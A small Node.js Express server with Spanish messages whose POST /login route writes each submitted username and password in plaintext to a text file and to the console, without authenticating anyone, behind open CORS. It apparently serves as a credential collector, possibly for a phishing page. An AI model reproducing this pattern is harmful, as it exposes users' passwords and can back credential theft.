const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.json());

const filePath = path.join(__dirname, 'usuarios.txt');

app.post('/login', (req, res) => {
  const { username, password } = req.body;

  const data = `Usuario: ${username}, Contraseña: ${password}\n`;

  fs.appendFile(filePath, data, (err) => {
    if (err) {
      console.error('Error guardando usuario:', err);
      return res.status(500).json({ message: 'Error guardando usuario' });
    }
    console.log('Usuario guardado:', data.trim());
    res.json({ message: 'Usuario guardado correctamente', usuario: { username } });
  });
});

app.listen(PORT, () => {
  console.log(`Servidor escuchando en http://localhost:${PORT}`);
});
